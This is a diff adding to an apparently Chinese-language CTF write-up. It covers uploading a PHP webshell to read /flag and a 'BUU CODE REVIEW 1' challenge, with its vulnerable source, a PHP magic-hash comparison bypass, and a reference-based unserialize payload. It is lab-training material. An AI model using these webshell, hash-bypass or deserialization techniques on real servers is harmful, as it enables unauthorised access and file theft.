@@ -123,3 +123,84 @@ function sleep(time) {
 我们需要上传一个 [webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) ，因为我用的需要上传两个文件，所以就上传了两遍。完成后查看回显地址，找到我们的 webshell 链接。一旦打开，我们就成功骇入了。
 
 执行 `cat /flag` 即可获得 flag 。
+
+## BUU CODE REVIEW 1
+
+启动靶机，打开网页看到代码。
+
+```php
+<?php
+/**
+ * Created by PhpStorm.
+ * User: jinzhao
+ * Date: 2019/10/6
+ * Time: 8:04 PM
+ */
+
+highlight_file(__FILE__);
+
+class BUU {
+   public $correct = "";
+   public $input = "";
+
+   public function __destruct() {
+       try {
+           $this->correct = base64_encode(uniqid());
+           if($this->correct === $this->input) {
+               echo file_get_contents("/flag");
+           }
+       } catch (Exception $e) {
+       }
+   }
+}
+
+if($_GET['pleaseget'] === '1') {
+    if($_POST['pleasepost'] === '2') {
+        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
+            unserialize($_POST['obj']);
+        }
+    }
+}
+```
+
+`pleaseget` 和 `pleasepost` 没有难度。MD5 值相当但值不相等利用的是 php `==` 的漏洞，如果两个字符串经过哈希后都以 `0E` 开头，PHP 会把它们解释为 `0` 。比如，`QNKCDZO` 和 `240610708` 。
+
+剩下的序列化是，由于 `uniqid()` 得出的值以微秒计，所以不能用值生成来做。这里比较巧妙的采用了引用。
+
+```php
+<?php
+/**
+ * Created by PhpStorm.
+ * User: jinzhao
+ * Date: 2019/10/6
+ * Time: 8:04 PM
+ */
+
+class BUU {
+   public $correct = "";
+   public $input = "";
+
+   public function __destruct() {
+       try {
+           $this->correct = base64_encode(uniqid());
+           if($this->correct === $this->input) {
+               echo file_get_contents("/flag");
+           }
+       } catch (Exception $e) {
+       }
+   }
+}
+
+$a = new BUU();
+$a -> input = &$a -> correct;
+
+echo serialize($a);
+```
+
+结果是：
+
+```
+O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
+```
+
+然后把这些值往 postman 里填就行，记得是 POST 。
